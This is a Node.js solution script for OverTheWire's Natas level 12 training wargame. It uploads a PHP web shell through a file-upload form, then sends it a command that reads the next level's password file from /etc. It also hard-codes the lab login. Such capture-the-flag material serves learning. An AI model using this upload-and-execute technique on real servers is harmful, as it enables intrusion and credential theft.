#!/usr/bin/env node
const axios = require("axios");
const cheerio = require("cheerio");
const FormData = require("form-data");
const fs = require("fs/promises");

const username = "natas12";
const password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3";

const url = `http://${username}.natas.labs.overthewire.org`;

(async () => {
  const form = new FormData();
  const file = await fs.readFile("./revshell.php");
  form.append("uploadedfile", file, "revshell.php");
  form.append("submit", "Submit");
  form.append("MAX_FILE_SIZE", "1000");
  form.append("filename", "revshell.php");
  const response = await axios.post(`${url}/index.php`, form, {
    auth: {
      username,
      password,
    },
    headers: { ...form.getHeaders() },
  });

  let $ = cheerio.load(response.data);
  const fileRe = /(.\w+).php/;
  const revshellFileName = $.html().match(fileRe)[1];
  const revshellFileUrl = `${url}/upload${revshellFileName}.php`;
  const params = new URLSearchParams([
    ["cmd", "cat /etc/natas_webpass/natas13"],
  ]);

  const commandOutput = await axios.get(`${revshellFileUrl}`, {
    auth: { username, password },
    params,
  });
  $ = cheerio.load(commandOutput.data);
  const re = /body>(.\w+)/;
  console.log($.html().match(re)[1]);
})();
